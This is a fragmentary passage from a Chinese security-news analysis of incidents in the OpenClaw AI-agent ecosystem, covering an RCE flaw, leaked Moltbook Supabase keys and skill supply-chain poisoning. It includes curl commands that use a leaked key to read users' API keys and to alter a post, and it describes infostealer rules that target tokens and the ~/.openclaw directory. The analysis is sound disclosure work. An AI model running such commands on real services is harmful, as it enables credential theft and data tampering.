...
date: 2026-04-02
fetch_date: 2026-04-03T04:27:14.884595
---

# OpenClaw近期生态安全事件解读：从RCE漏洞到Skill供应链投毒分析

OpenClaw近期生态安全事件解读：从RCE漏洞到Skill供应链投毒分析 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
...
![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)9536

收藏

导语：本文将对上述四起相关安全事件进行技术剖析、逻辑还原与复盘。
...
![图片45.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20260402/1775119825351128.png "1775119825351128.png")
...
![图片46.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20260402/1775119836146491.png "1775119836146491.png")
...
![图片47.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20260402/1775119849718121.png "1775119849718121.png")
...
#通过窃取泄露Key可通过rest api 执行select操作，从而获取用户api\_key信息

curl
https://ehxbxtjliybbloantpwq.supabase.co/rest/v1/agents?select=name,api\_key&limit=3" -H "apikey: sxxxxxxx"

![图片48.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20260402/1775119863136016.png "1775119863136016.png")

图4. 通过前端泄露的Key进一步获取存储在Moltbook中的用户API Key信息

![图片49.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20260402/1775119874110042.png "1775119874110042.png")
...
curl -X PATCH "https://ehxbxtjliybbloantpwq.supabase.co/rest/v1/posts?id=eq.74b073fd-37db-4a32-a9e1-c7652e5c0d59" -H "apikey: sb\_pubxxxx-" -H "Content-Type: application/json" -d '{"title":"@galnagli - responsible disclosure test","content":"@galnagli - responsible disclosure test"}'
...
此次攻击的威胁在于攻击者并不需要去挖掘OpenClaw代码本身的复杂0 Day漏洞，仅仅需要更新木马配置文件中的“文件抓取器（File Grabber）”规则模块，将token和private key等高价值关键字以及默认存储目录~/.openclaw加入扫描列表即可。当受害者因安全意识薄弱而执行了携带木马的程序时，木马便会利用当前操作系统赋予该用户的默认读写权限，在后台扫描并迅速打包整个OpenClaw的本地配置目...